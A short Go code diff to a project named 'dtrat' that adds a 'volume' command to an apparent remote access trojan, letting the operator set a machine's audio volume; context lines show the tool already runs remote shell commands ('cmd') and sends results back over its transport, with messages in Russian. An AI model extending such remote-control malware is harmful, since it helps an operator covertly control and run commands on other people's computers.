@@ -6,6 +6,7 @@ import (
 	"dtrat/transport"
 	"fmt"
 	"os"
+	"strconv"
 	"strings"
 )
 
@@ -40,6 +41,8 @@ func (r *Rat) commandsSwitch(text string) {
 		go r.usbCmd(args)
 	case "cmd":
 		go r.cmdCmd(args)
+	case "volume":
+		go r.volumeCmd(args)
 	default:
 		go r.defaultCmd()
 	}
@@ -244,4 +247,20 @@ func (r *Rat) cmdCmd(args string) {
 	}
 
 	r.Transport.Send("Результат:\n%s", out)
+}
+
+func (r *Rat) volumeCmd(args string) {
+	volume, err := strconv.Atoi(args)
+	if err != nil {
+		r.Transport.Send("Ошибка: аргумент должен быть числом от 0 до 100.")
+		return
+	}
+
+	err = r.Engine.System.SetVolume(volume)
+	if err != nil {
+		r.Transport.Send("Ошибка: %v", err)
+		return
+	}
+
+	r.Transport.Send("Громкость успешно установлена на %d%%.", volume)
 }
